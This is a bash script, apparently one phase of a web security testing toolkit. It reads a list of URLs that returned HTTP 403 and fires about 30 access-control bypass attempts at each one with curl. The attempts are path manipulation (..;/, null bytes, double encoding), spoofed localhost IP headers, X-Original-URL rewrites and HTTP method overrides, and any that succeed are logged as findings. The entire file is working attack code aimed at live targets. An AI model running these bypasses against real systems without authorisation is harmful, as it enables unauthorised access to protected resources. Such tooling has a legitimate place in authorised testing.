#!/usr/bin/env bash
# ╔══════════════════════════════════════════════════════════════╗
# ║  ac_403_bypass.sh — 403 Bypass (30+ Techniques)              ║
# ║  URL manipulation · Header injection · Method override        ║
# ║  Reads ac_403_urls.txt from Phase 2, outputs bypass findings  ║
# ╚══════════════════════════════════════════════════════════════╝
set -uo pipefail

SCRIPT_NAME="ac_403_bypass.sh"
SCRIPT_DESC="403 Bypass (30+ Techniques)"
MAX_403_URLS=100

script_usage() {
    echo "Usage: ${SCRIPT_NAME} [OPTIONS]"
    echo ""
    echo "  Test 30+ bypass techniques against 403-blocked URLs."
    echo "  Reads ac_403_urls.txt from content discovery (Phase 2)."
    echo ""
    echo "Options:"
    echo "  -d, --domain DOMAIN    Target domain"
    echo "  -u, --urls FILE        File with 403 URLs (default: OUT_DIR/ac_403_urls.txt)"
    echo "  -o, --out DIR          Output directory (default: ./out)"
    echo "  -t, --threads N        Concurrency (default: 30)"
    echo "  -h, --help             Show this help"
}

LIB_DIR="$(cd "$(dirname "$0")/.." && pwd)"
source "${LIB_DIR}/lib.sh"
parse_common_args "$@"

phase_header "6" "$SCRIPT_DESC"

# ── Locate 403 URL list ──────────────────────────────────────────
INPUT_403=""
if [ -n "${URLS_FILE:-}" ] && [ -f "$URLS_FILE" ]; then
    INPUT_403="$URLS_FILE"
elif [ -f "${OUT_DIR}/ac_403_urls.txt" ]; then
    INPUT_403="${OUT_DIR}/ac_403_urls.txt"
fi

if [ -z "$INPUT_403" ] || [ ! -s "$INPUT_403" ]; then
    warn "No 403 URLs found — provide --urls or run Phase 2 (ac_content_discovery.sh) first"
    exit 0
fi

total_urls=$(count_lines "$INPUT_403")
if [ "$total_urls" -gt "$MAX_403_URLS" ]; then
    warn "Capping 403 URL list from ${total_urls} to ${MAX_403_URLS}"
fi
WORK_LIST="${OUT_DIR}/_ac_403_work.txt"
head -n "$MAX_403_URLS" "$INPUT_403" | sort -u > "$WORK_LIST"
url_count=$(count_lines "$WORK_LIST")
info "Testing ${url_count} URLs with 30+ bypass techniques"

# ── Output file ──────────────────────────────────────────────────
FINDINGS_FILE="${OUT_DIR}/ac_bypass_findings.txt"
> "$FINDINGS_FILE"

# ── Helper: extract path and domain from URL ─────────────────────
extract_parts() {
    local url="$1"
    # Domain: strip scheme, strip path
    URL_DOMAIN=$(echo "$url" | sed 's|https\?://||;s|/.*||')
    # Path: everything after domain (or / if none)
    URL_PATH=$(echo "$url" | sed 's|https\?://[^/]*||')
    [ -z "$URL_PATH" ] && URL_PATH="/"
    # Scheme
    URL_SCHEME=$(echo "$url" | grep -oP '^https?' || echo "https")
    # Base: scheme + domain
    URL_BASE="${URL_SCHEME}://${URL_DOMAIN}"
}

# ── Helper: test a single bypass and record result ────────────────
# Usage: try_bypass "label" curl_args...
# Expects ORIG_URL, ORIG_STATUS, FINDINGS_FILE to be set
try_bypass() {
    local label="$1"
    shift

    local result
    result=$(curl -sk -o /dev/null -w "%{http_code}:%{size_download}" --max-time 5 \
        "${HUNT_UA_CURL[@]}" "$@" 2>/dev/null) || return 0

    local status="${result%%:*}"
    local size="${result##*:}"

    # Only record if status changed from 403 to something interesting
    if [ "$status" = "200" ] && [ "${size:-0}" -gt 0 ]; then
        echo "[HIGH] ${ORIG_URL} -> ${label} [${status}:${size}]" >> "$FINDINGS_FILE"
        log "  ${RED}[HIGH]${NC} ${ORIG_URL} -> ${label} [${status}:${size}]"
    elif [[ "$status" =~ ^(301|302)$ ]]; then
        echo "[MEDIUM] ${ORIG_URL} -> ${label} [${status}:${size}]" >> "$FINDINGS_FILE"
        log "  ${YELLOW}[MEDIUM]${NC} ${ORIG_URL} -> ${label} [${status}:${size}]"
    fi
}

# ── Main bypass loop ─────────────────────────────────────────────
tested=0
while IFS= read -r ORIG_URL; do
    [ -z "$ORIG_URL" ] && continue
    ((tested++)) || true

    extract_parts "$ORIG_URL"

    # Verify URL is still 403
    ORIG_STATUS=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 \
        "${HUNT_UA_CURL[@]}" "$ORIG_URL" 2>/dev/null) || ORIG_STATUS="000"

    if [ "$ORIG_STATUS" != "403" ]; then
        info "  [${tested}/${url_count}] ${ORIG_URL} — now ${ORIG_STATUS}, skipping"
        continue
    fi

    info "  [${tested}/${url_count}] ${ORIG_URL}"

    # Strip trailing slash for consistent manipulation
    CLEAN_URL="${ORIG_URL%/}"

    # ═══════════════════════════════════════════════════════════════
    # URL MANIPULATION (15 techniques)
    # ═══════════════════════════════════════════════════════════════

    # 1. Append /
    try_bypass "${CLEAN_URL}/" "${CLEAN_URL}/"

    # 2. Append /.
    try_bypass "${CLEAN_URL}/." "${CLEAN_URL}/."

    # 3. Append /./
    try_bypass "${CLEAN_URL}/./" "${CLEAN_URL}/./"

    # 4. Append ..;/
    try_bypass "${CLEAN_URL}..;/" "${CLEAN_URL}..;/"

    # 5. Append ;/
    try_bypass "${CLEAN_URL};/" "${CLEAN_URL};/"

    # 6. Append %20 (space)
    try_bypass "${CLEAN_URL}%20" "${CLEAN_URL}%20"

    # 7. Append %09 (tab)
    try_bypass "${CLEAN_URL}%09" "${CLEAN_URL}%09"

    # 8. Append %00 (null byte)
    try_bypass "${CLEAN_URL}%00" "${CLEAN_URL}%00"

    # 9. Append .json
    try_bypass "${CLEAN_URL}.json" "${CLEAN_URL}.json"

    # 10. Append .html
    try_bypass "${CLEAN_URL}.html" "${CLEAN_URL}.html"

    # 11. Append ?
    try_bypass "${CLEAN_URL}?" "${CLEAN_URL}?"

    # 12. Append #
    try_bypass "${CLEAN_URL}#" "${CLEAN_URL}#"

    # 13. Double URL encode path: replace / with %252f
    DOUBLE_ENCODED="${URL_BASE}$(echo "$URL_PATH" | sed 's|/|%252f|g')"
    try_bypass "${DOUBLE_ENCODED}" "$DOUBLE_ENCODED"

    # 14. Append /.randomstring
    try_bypass "${CLEAN_URL}/.bypass403check" "${CLEAN_URL}/.bypass403check"

    # 15. Path with /..;/
    # Insert /..;/ before the last path component
    PARENT_PATH=$(dirname "$URL_PATH")
    LAST_COMPONENT=$(basename "$URL_PATH")
    if [ "$PARENT_PATH" != "/" ]; then
        DOTDOT_URL="${URL_BASE}${PARENT_PATH}/..;/${LAST_COMPONENT}"
    else
        DOTDOT_URL="${URL_BASE}/..;/${LAST_COMPONENT}"
    fi
    try_bypass "${DOTDOT_URL}" "$DOTDOT_URL"

    # ═══════════════════════════════════════════════════════════════
    # HEADER INJECTION (12 techniques)
    # ═══════════════════════════════════════════════════════════════

    # 1. X-Original-URL
    try_bypass "H:X-Original-URL:${URL_PATH}" \
        -H "X-Original-URL: ${URL_PATH}" "${URL_BASE}/"

    # 2. X-Rewrite-URL
    try_bypass "H:X-Rewrite-URL:${URL_PATH}" \
        -H "X-Rewrite-URL: ${URL_PATH}" "${URL_BASE}/"

    # 3. X-Forwarded-For: 127.0.0.1
    try_bypass "H:X-Forwarded-For:127.0.0.1" \
        -H "X-Forwarded-For: 127.0.0.1" "$ORIG_URL"

    # 4. X-Custom-IP-Authorization: 127.0.0.1
    try_bypass "H:X-Custom-IP-Authorization:127.0.0.1" \
        -H "X-Custom-IP-Authorization: 127.0.0.1" "$ORIG_URL"

    # 5. X-Real-IP: 127.0.0.1
    try_bypass "H:X-Real-IP:127.0.0.1" \
        -H "X-Real-IP: 127.0.0.1" "$ORIG_URL"

    # 6. X-Client-IP: 127.0.0.1
    try_bypass "H:X-Client-IP:127.0.0.1" \
        -H "X-Client-IP: 127.0.0.1" "$ORIG_URL"

    # 7. X-Remote-IP: 127.0.0.1
    try_bypass "H:X-Remote-IP:127.0.0.1" \
        -H "X-Remote-IP: 127.0.0.1" "$ORIG_URL"

    # 8. X-Remote-Addr: 127.0.0.1
    try_bypass "H:X-Remote-Addr:127.0.0.1" \
        -H "X-Remote-Addr: 127.0.0.1" "$ORIG_URL"

    # 9. X-Host: localhost
    try_bypass "H:X-Host:localhost" \
        -H "X-Host: localhost" "$ORIG_URL"

    # 10. X-ProxyUser-Ip: 127.0.0.1
    try_bypass "H:X-ProxyUser-Ip:127.0.0.1" \
        -H "X-ProxyUser-Ip: 127.0.0.1" "$ORIG_URL"

    # 11. Referer: https://{domain}/{path}
    try_bypass "H:Referer:https://${URL_DOMAIN}${URL_PATH}" \
        -H "Referer: https://${URL_DOMAIN}${URL_PATH}" "$ORIG_URL"

    # 12. Content-Length: 0 with POST method
    try_bypass "POST+H:Content-Length:0" \
        -X POST -H "Content-Length: 0" "$ORIG_URL"

    # ═══════════════════════════════════════════════════════════════
    # METHOD OVERRIDE (3 techniques + 3 HTTP methods)
    # ═══════════════════════════════════════════════════════════════

    # 1. X-HTTP-Method-Override: GET
    try_bypass "H:X-HTTP-Method-Override:GET" \
        -X POST -H "X-HTTP-Method-Override: GET" "$ORIG_URL"

    # 2. X-Method-Override: GET
    try_bypass "H:X-Method-Override:GET" \
        -X POST -H "X-Method-Override: GET" "$ORIG_URL"

    # 3. Different HTTP methods: POST, PUT, PATCH
    try_bypass "METHOD:POST" \
        -X POST "$ORIG_URL"

    try_bypass "METHOD:PUT" \
        -X PUT "$ORIG_URL"

    try_bypass "METHOD:PATCH" \
        -X PATCH "$ORIG_URL"

done < "$WORK_LIST"

# ── Cleanup ──────────────────────────────────────────────────────
rm -f "$WORK_LIST"

# ── Summary ──────────────────────────────────────────────────────
if [ -s "$FINDINGS_FILE" ]; then
    sort -u -o "$FINDINGS_FILE" "$FINDINGS_FILE"
    finding_count=$(count_lines "$FINDINGS_FILE")
    high_count=$(grep -c '^\[HIGH\]' "$FINDINGS_FILE" 2>/dev/null || echo 0)
    medium_count=$(grep -c '^\[MEDIUM\]' "$FINDINGS_FILE" 2>/dev/null || echo 0)
    log "403 bypass: ${finding_count} bypasses found"
    log "  HIGH (403->200):   ${high_count}"
    log "  MEDIUM (403->3xx): ${medium_count}"
    log "  Results: ${FINDINGS_FILE}"
else
    info "No 403 bypasses found across ${tested} URLs"
fi
